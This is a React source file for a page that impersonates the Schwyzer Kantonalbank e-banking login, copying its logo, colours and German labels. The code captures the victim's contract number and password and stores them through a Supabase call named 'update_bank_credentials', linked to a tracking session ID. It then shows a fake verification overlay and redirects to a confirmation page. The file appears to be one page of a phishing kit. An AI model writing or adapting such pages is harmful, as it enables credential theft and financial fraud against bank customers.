import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/schwyzer-kantonalbank-logo.svg.asset.json";

const RED = "#e3000f";
const RED_DARK = "#7a0810";
const RED_MUTED = "#a85d63";

const ChSchwyzerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  usePageMeta("Schwyzer Kantonalbank – E-Banking", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const canSubmit =
    vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const inputClass =
    "w-full h-[44px] px-3 bg-[#f8f8f8] border-2 border-[#ededed] rounded-[6px] text-[15px] " +
    "outline-none focus:border-[#bdbdbd]";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-white">
        <div className="max-w-[720px] mx-auto px-4 pt-6 md:pt-10">
          {/* Header card */}
          <div className="bg-white border border-[#ebebeb] rounded-[2px] px-6 py-4 flex items-center">
            <img
              src={logoAsset.url}
              alt="Schwyzer Kantonalbank"
              className="h-[50px] md:h-[70px] object-contain"
            />
          </div>

          {/* Login card */}
          <div className="mt-6 bg-white border border-[#ebebeb] rounded-[2px] px-6 py-6 md:px-8 md:py-8">
            <h1 className="text-[20px] md:text-[24px] font-semibold text-black mb-6">
              Anmeldung E-Banking
            </h1>

            <div className="space-y-5">
              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4 md:items-center">
                <label
                  htmlFor="szkb-vnr"
                  className="text-[15px] text-black text-left"
                >
                  Vertragsnummer
                </label>
                <input
                  id="szkb-vnr"
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className={inputClass}
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4 md:items-center">
                <label
                  htmlFor="szkb-pw"
                  className="text-[15px] text-black text-left"
                >
                  Passwort
                </label>
                <input
                  id="szkb-pw"
                  type="password"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className={inputClass}
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4">
                <div className="hidden md:block" />
                <div className="flex justify-end">
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={!canSubmit}
                    style={{
                      backgroundColor: canSubmit ? RED_DARK : "transparent",
                      borderColor: canSubmit ? RED_DARK : RED_MUTED,
                      color: canSubmit ? "#ffffff" : RED_MUTED,
                      cursor: canSubmit ? "pointer" : "not-allowed",
                    }}
                    className="w-full md:w-auto px-10 h-[44px] border rounded-[2px] text-[15px] font-medium transition-colors"
                  >
                    Anmelden
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-[180px_1fr] gap-2 md:gap-4 pt-2">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="text-[14px] text-left hover:underline"
                  style={{ color: RED }}
                >
                  Passwort vergessen
                </a>
                <div />
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default ChSchwyzerKantonalbank;
